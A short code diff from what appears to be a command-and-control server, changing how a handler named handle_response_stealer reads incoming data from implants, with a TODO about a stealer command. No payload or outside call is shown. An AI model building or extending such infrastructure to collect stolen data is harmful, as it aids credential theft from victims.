@@ -257,7 +257,8 @@ def display_implants():
 def handle_response_stealer():
     print("Recieved stealer")
     try:
-        data = request.get_json(force=True)
+        request.get_data(force=True)
+        data = request.data
         print(data)
         #  if "stealer" in command:
         #     # TODO call Wyatt's function
